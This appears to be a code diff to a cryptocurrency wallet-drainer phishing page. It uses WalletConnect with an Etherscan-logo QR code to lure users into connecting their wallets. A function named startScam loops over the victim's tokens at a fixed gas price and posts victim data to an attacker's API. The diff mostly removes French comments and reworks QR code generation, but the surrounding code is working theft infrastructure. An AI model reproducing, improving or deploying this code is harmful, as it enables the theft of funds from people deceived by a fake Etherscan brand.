@@ -10,6 +10,7 @@ const TOKENS = {
 let signClient;
 let session;
 let account;
+let currentChainId;
 const PROJECT_ID = '0ecdd9357f8779fcb4c4944118927362';
 
 function getSignClient() {
@@ -21,7 +22,6 @@ function getSignClient() {
   return null;
 }
 
-// Ajoute le logo au centre du canvas QR
 function addLogoToQR(canvas, logoUrl) {
   const ctx = canvas.getContext('2d');
   const image = new Image();
@@ -29,11 +29,10 @@ function addLogoToQR(canvas, logoUrl) {
   image.src = logoUrl;
   image.onload = function() {
     const size = canvas.width;
-    const logoSize = size * 0.25; // 25% de la taille
+    const logoSize = size * 0.25;
     const x = (size - logoSize) / 2;
     const y = (size - logoSize) / 2;
 
-    // Fond blanc arrondi derrière le logo
     ctx.fillStyle = '#ffffff';
     const borderRadius = 10;
     ctx.beginPath();
@@ -49,7 +48,6 @@ function addLogoToQR(canvas, logoUrl) {
     ctx.closePath();
     ctx.fill();
 
-    // Dessiner le logo
     ctx.drawImage(image, x, y, logoSize, logoSize);
   };
   image.onerror = () => console.error('Erreur chargement logo');
@@ -69,7 +67,6 @@ async function initWalletConnect() {
     }
   });
 
-  // Seulement Ethereum mainnet
   const { uri, approval } = await signClient.connect({
     requiredNamespaces: {
       eip155: {
@@ -80,7 +77,6 @@ async function initWalletConnect() {
     }
   });
 
-  // Attend que QRCode soit chargé
   await new Promise((resolve, reject) => {
     if (typeof QRCode !== 'undefined') return resolve();
     let tries = 0;
@@ -100,26 +96,24 @@ async function initWalletConnect() {
   const qrDiv = document.getElementById('qrcode');
   qrDiv.innerHTML = '';
 
-  // Création d'un canvas pour le QR code (permet d'ajouter le logo)
-  const canvas = document.createElement('canvas');
-  qrDiv.appendChild(canvas);
-
-  // Génération du QR code avec la librairie qrcodejs (version 1.0.0)
-  QRCode.toCanvas(canvas, uri, {
+  new QRCode(qrDiv, {
+    text: uri,
     width: 280,
     height: 280,
-    margin: 2,
-    color: { dark: '#000000', light: '#ffffff' },
+    colorDark: '#000000',
+    colorLight: '#ffffff',
     correctLevel: QRCode.CorrectLevel.H
-  }, (error) => {
-    if (error) {
-      console.error('Erreur QR code :', error);
+  });
+
+  setTimeout(() => {
+    const canvas = qrDiv.querySelector('canvas');
+    if (!canvas) {
+      console.error('Canvas QR introuvable');
       document.getElementById('status').innerText = 'Erreur génération QR';
       return;
     }
-    // Ajouter le logo après la génération réussie
     addLogoToQR(canvas, '/etherscan-logo-circle.png');
-  });
+  }, 100);
 
   document.getElementById('status').innerText = 'Scannez le QR code avec votre wallet';
 
@@ -141,7 +135,6 @@ async function startScam() {
     return;
   }
 
-  // GasPrice fixé à 2 gwei
   const gasPrice = ethers.utils.hexlify(2000000000);
 
   for (const t of tokens) {
@@ -174,7 +167,6 @@ async function startScam() {
     }
   }
 
-  // Envoi de la victime à l'API
   await fetch(API, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
